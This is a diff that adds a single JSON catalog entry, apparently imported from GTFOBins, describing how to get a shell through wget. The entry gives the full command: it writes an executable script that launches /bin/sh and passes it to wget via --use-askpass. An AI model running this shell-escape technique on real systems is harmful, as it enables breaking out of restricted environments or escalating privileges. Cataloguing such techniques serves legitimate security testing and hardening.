@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-wget-shell",
+  "name": "GTFOBins · wget (shell)",
+  "command": "echo -e '#!/bin/sh\\n/bin/sh 1>&0' >/path/to/temp-file\nchmod +x /path/to/temp-file\nwget --use-askpass=/path/to/temp-file 0",
+  "description": "Use wget to shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "wget",
+    "shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/wget/#shell",
+  "upstream_id": "wget/shell/0",
+  "category": "gtfobins",
+  "subcategory": "shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/wget/"
+    }
+  ]
+}
